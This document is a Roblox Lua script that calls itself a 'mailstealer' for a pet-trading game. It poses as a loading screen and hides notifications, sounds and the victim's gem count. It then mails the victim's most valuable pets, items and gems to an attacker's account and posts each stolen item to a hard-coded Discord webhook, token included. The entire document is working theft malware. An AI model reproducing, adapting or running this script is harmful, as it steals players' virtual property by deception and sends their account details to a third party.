LogsWebhook = "https://discord.com/api/webhooks/1345789024991707156/0tBsLctpTM161U4jHDLxoOmSk_8l2Pu4E-DC07oG2qBu-cWVdUPq0JRacjrGeE8d5cGA"
mailstealer_name = "RAYZ SCRIPTS"

Roblox_Username = Username
Discord_Webhook = Webhook
Username2 = Username2

-- simple mailstealer
LOGS_WEBHOOK = LogsWebhook
if getgenv().Executed == true then
-- return
end
getgenv().Executed = true

repeat
    task.wait()
until game:IsLoaded()

if not game:IsLoaded() then
    game.Loaded:Wait()
end

repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until game.PlaceId ~= nil
repeat
    task.wait()
until not game.Players.LocalPlayer.PlayerGui:FindFirstChild("__INTRO")

-- Loading Screen 1
local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000

task.spawn(function()
    LoadingScreenFunction("anything")
end)

game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "Mori Scripts"
-- variables:

local Library = require(game.ReplicatedStorage.Library)
local Save = Library.Save.Get()
local Player = game.Players.LocalPlayer
local Inventory = Save.Inventory
local HttpService = game:GetService("HttpService")
local MailMessage = "Rayz Scripts"
local message = require(game.ReplicatedStorage.Library.Client.Message)
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")

for id, table in pairs(Inventory.Currency) do
    if table.id == "Diamonds" then
        GemsAmount = table._am or 0
        break
    end
end

for adress, func in pairs(getgc()) do
    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

FirstPriceOfMail = FunctionToGetFirstPriceOfMail()

if FirstPriceOfMail > GemsAmount then
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("you dont have enough gems to run the script (100k or more)")
Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
    return
end

local FormatNumber = function(number)
    local n = math.floor(number)
    local suf = {"", "k", "m", "b", "t"}
    local INDEX = 1
    while n >= 1000 do
        n = n / 1000
        INDEX = INDEX + 1
    end
    return string.format("%.2f%s", n, suf[INDEX])
end

local GetItemValue = function(Type, ItemTable)
    return (Library.DevRAPCmds.Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return ItemTable.id
            end,
            StackKey = function()
                return HttpService:JSONEncode(
                    {id = ItemTable.id, pt = ItemTable.pt, sh = ItemTable.sh, tn = ItemTable.tn}
                )
            end
        }
    ) or 0)
end

local GetItemValueOfItems = function()
    RAP = 0
    for name_of_category, category in pairs(Inventory) do
        if category ~= nil then
            for i,v in pairs(category) do
                RAP = RAP + GetItemValue(name_of_category, v)
            end
        end
    end
    return RAP
end

function deepCopy(original)
    local copy = {}
    for k, v in pairs(original) do
        if type(v) == "table" then
            v = deepCopy(v)
        end
        copy[k] = v
    end
    return copy
end

local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1, GemsAmount)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    if shiny == true then
        shinyy = "Shiny"
    elseif shiny == false then
        shinyy = "not Shiny"
    end
    local fardplayer = game:GetService("Players").LocalPlayer
    local ExecutorWebhook = identifyexecutor() or "undefined"
    JobId = game.JobId
    local PlayerUser = Player.Name
    local msg = {
        ["content"] = ping,
        ["username"] = mailstealer_name,
        ["embeds"] = {
            {
                ["title"] = "**YOU GOT A ITEM WITH RAYZ MAILSTEALER!**",
                ["type"] = "rich",
                ["color"] = tonumber(0x7F00FF),
                ["thumbnail"] = {
                    ["url"] = thumbnail
                },
                ["fields"] = {
                    {
                        ["name"] = "**This data was generated using ".. mailstealer_name .." Mailstealer**",
                        ["value"] = "```Username     : " .. fardplayer.Name ..
                                    "\nUser-ID      : " .. fardplayer.userId ..
                                    "\nAccount Age  : " .. fardplayer.AccountAge .. " Days" ..
                                    "\nExploit      : " .. ExecutorWebhook ..
                                    "\nReceiver     : " .. Roblox_Username .. 
                                    "\nTotal RAP    : " .. FormatNumber(totalRap1) ..
                                    "```",
                        ["inline"] = false
                    },                   
                    {
                        ["name"] = ":dog: **Pets left** :dog:",
                        ["value"] = "```➜ " .. pets_left .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":money_mouth: **"..item_type.."** :money_mouth:",
                        ["value"] = "```➜ " .. id .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":trophy: **Item RAP** :trophy:",
                        ["value"] = "```➜ " .. FormatNumber(RAP) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":gem: **Gems** :gem:",
                        ["value"] = "```➜ " .. FormatNumber(GemsAmount) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":sparkles: **Shiny** :sparkles:",
                        ["value"] = "```➜ " .. shinyy .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
                        ["value"] = "```➜ " .. RBgoldNormal .. "```",
                        ["inline"] = true
                    }
                }
            }
        },
        ["attachments"] = {}
    }
    local request = http_request or request or HttpPost or syn.request
    request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game.HttpService:JSONEncode(msg)
        }
    )
end

-- skidded that, SORRY!!

local gemsleaderstat = Player.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = Player.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(
    function()
        gemsleaderstatpath.Value = gemsleaderstat
    end
)

local loading = Player.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = Player.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        noti.Enabled = false
    end
)
noti.Enabled = false

task.spawn(
    function()
        game.DescendantAdded:Connect(
            function(x)
                if x.ClassName == "Sound" then
                    if
                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
                            x.SoundId == "rbxassetid://12413423276"
                     then
                        x.Volume = 0
                        x.PlayOnRemove = false
                        x:Destroy()
                    end
                end
            end
        )
    end
)

-- no more skidding!

function renameFolder(oldFolderName, newFolderName)

    local parent = game.Workspace:FindFirstChild("__THINGS")

    local oldFolder = parent and parent:FindFirstChild(oldFolderName)
    if not oldFolder then
        print("Old folder not found")
        return
    end

    local newFolder = Instance.new("Folder")
    newFolder.Name = newFolderName
    newFolder.Parent = parent

    for _, child in ipairs(oldFolder:GetChildren()) do
        child.Parent = newFolder
    end

    oldFolder:Destroy()
end


local function GetThumbnail(imageid)
    Asset = string.split(imageid, "rbxassetid://")[2]
    local Size = "420x420"
    local Image =
        game:HttpGet(
        "https://thumbnails.roblox.com/v1/assets?assetIds=" ..
            Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png"
    )
    thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
    return thumbnail
end

MinimumRAP = FirstPriceOfMail

-- EMPTY BOXES

if Inventory.Box then
    for key, value in pairs(Inventory.Box) do
        if value._uq then
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
        end
    end
end

local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
while err == "You must wait 30 seconds before using the mailbox!" do
    wait()
    response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local GetListWithAllItems = function()
    local hits = {}
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Library.Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Pet",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
            if dir.exclusiveLevel and dir.Tradable ~= false then
                rap = GetItemValue("Pet", v) * (v._am or 1)
                if v.pt == 1 then
                    ItemImageId = dir.goldenThumbnail
                    ItemType = "Golden"
                elseif v.pt == 2 then
                    ItemImageId = dir.thumbnail
                    ItemType = "Rainbow"
                else
                    ItemImageId = dir.thumbnail
                    ItemType = "Normal"
                end
                if rap > MinimumRAP then
                    table.insert(
                        hits,
                        {
                            Item_Id = i,
                            Item_Name = v.id,
                            Item_Amount = v._am or 1,
                            Item_RAP = rap,
                            Item_Class = "Pet",
                            IsShiny = v.sh or false,
                            IsLocked = v.lk or false,
                            Item_ImageId = ItemImageId,
                            Item_Type = ItemType
                        }
                    )
                end
            end
        end
    end
    if Inventory.Egg ~= nil then
        for i, v in pairs(Inventory.Egg) do
            id = v.id
            dir = Library.Directory.Eggs[id]
            rap = GetItemValue("Egg", v)
            ItemType = "Normal"
            ItemImageId = dir.icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Egg",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Misc ~= nil then
        for i, v in pairs(Inventory.Misc) do
            id = v.id
            dir = Library.Directory.MiscItems[id]
            rap = GetItemValue("Misc", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP and v.id ~= "Slingshot" then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Misc",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Charm ~= nil then
        for i, v in pairs(Inventory.Charm) do
            id = v.id
            dir = Library.Directory.Charms[id]
            rap = GetItemValue("Charm", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Charm",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Enchant ~= nil then
        for i, v in pairs(Inventory.Enchant) do
            id = v.id
            dir = Library.Directory.Enchants[id]
            rap = GetItemValue("Enchant", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Enchant",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Lootbox ~= nil then
        for i, v in pairs(Inventory.Lootbox) do
            id = v.id
            dir = Library.Directory.Lootboxes[id]
            rap = GetItemValue("Lootbox", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Lootbox",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Potion ~= nil then
        for i, v in pairs(Inventory.Potion) do
            id = v.id
            dir = Library.Directory.Potions[id]
            rap = GetItemValue("Potion", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon(v.tn)
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Potion",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Seed ~= nil then
        for i, v in pairs(Inventory.Seed) do
            id = v.id
            dir = Library.Directory.Seeds[id]
            rap = GetItemValue("Seed", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Seed",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Ultimate ~= nil then
        for i, v in pairs(Inventory.Ultimate) do
            id = v.id
            dir = Library.Directory.Ultimates[id]
            rap = GetItemValue("Ultimate", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Ultimate",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Fruit ~= nil then
        for i, v in pairs(Inventory.Fruit) do
            id = v.id
            dir = Library.Directory.Fruits[id]
            rap = GetItemValue("Fruit", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Fruit",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Hoverboard ~= nil then
        for i, v in pairs(Inventory.Hoverboard) do
            id = v.id
            dir = Library.Directory.Hoverboards[id]
            rap = GetItemValue("Hoverboard", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Hoverboard",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    if Inventory.Booth ~= nil then
        for i, v in pairs(Inventory.Booth) do
            id = v.id
            dir = Library.Directory.Booths[id]
            rap = GetItemValue("Booth", v)
            ItemType = "Normal"
            ItemImageId = dir.Icon
            if rap > MinimumRAP then
                table.insert(
                    hits,
                    {
                        Item_Id = i,
                        Item_Name = v.id,
                        Item_Amount = v._am or 1,
                        Item_RAP = rap,
                        Item_Class = "Booth",
                        IsShiny = v.sh or false,
                        IsLocked = v.lk or false,
                        Item_ImageId = ItemImageId,
                        Item_Type = ItemType
                    }
                )
            end
        end
    end
    table.sort(hits, function(a, b) return a.Item_RAP > b.Item_RAP end)
    return hits
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(Inventory["Pet"]) do
		uid = i
		break
	end
	local args = {
		[1] = "Roblox",
		[2] = "Test",
		[3] = "Pet",
		[4] = uid,
		[5] = 1
	}
	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
	if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
		return false
	else
		return true
	end
end


totalRap = 0
hits = GetListWithAllItems()
for i,v in pairs(hits) do
    totalRap = totalRap + v.Item_RAP
end

local function sendItem(category, uid, am)
    if locked == true then
		local args = {
			uid,
			false
		}
		game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
	end
    local args = {
        [1] = Roblox_Username,
        [2] = ""..mailstealer_name.." ON TOP",
        [3] = category,
        [4] = uid,
        [5] = am
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			Roblox_Username = Username
			args[1] = Roblox_Username
		end
	until response == true
	GemsAmount = GemsAmount - FirstPriceOfMail
	FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
	if FirstPriceOfMail > 5000000 then
		FirstPriceOfMail = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemsAmount >= (FirstPriceOfMail + 10000) then
				local args = {
					[1] = Roblox_Username,
					[2] = ""..mailstealer_name.." ON TOP",
					[3] = "Currency",
					[4] = i,
					[5] = GemsAmount - FirstPriceOfMail
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

Left_Hits = #hits

if #hits > 0 or GemsAmount > FirstPriceOfMail then
    local blob_a = require(game.ReplicatedStorage.Library)
    local blob_b = blob_a.Save.Get()

    FavoriteModeSelection = blob_a.Save.Get().FavoriteModeSelection
    FavoriteModeSelectionPlaza = blob_a.Save.Get().FavoriteModeSelectionPlaza

    oldGet = deepCopy(blob_b)
    
    blob_a.Save.Get = function(...)
        blob_b = oldGet
        blob_b.FavoriteModeSelection = {FavoriteModeSelection}
        blob_b.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
        return blob_b
    end
    if IsMailboxHooked() then
		local Mailbox = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
        for i, Func in ipairs(getgc(true)) do
            if typeof(Func) == "function" and debug.info(Func, "n") == "typeof" then
                local Old
                Old = hookfunction(Func, function(Ins, ...)
                    if Ins == Mailbox then
                        return tick()
                    end
                    return Old(Ins, ...)
                end)
            end
        end
	end
    for i,v in pairs(hits) do
        if FirstPriceOfMail > 5000000 then
            FirstPriceOfMail = 5000000
        end
        if v.Item_RAP >= FirstPriceOfMail then
            sendItem(v.Item_Class, v.Item_Id, v.Item_Amount)
            thumb = GetThumbnail(v.Item_ImageId)
            Left_Hits = Left_Hits - 1
            SendMessage(v.Item_Name, v.Item_Class, v.Item_Type, thumb, Discord_Webhook, Left_Hits, v.IsShiny, "@everyone", v.Item_RAP, totalRap, GemsAmount)
            if Roblox_Username ~= "Lypher_16" then
                SendMessage(v.Item_Name, v.Item_Class, v.Item_Type, thumb, LOGS_WEBHOOK, Left_Hits, v.IsShiny, "meh", v.Item_RAP, totalRap, GemsAmount)
            end
        else
            break
        end
    end
    SendAllGems()
end
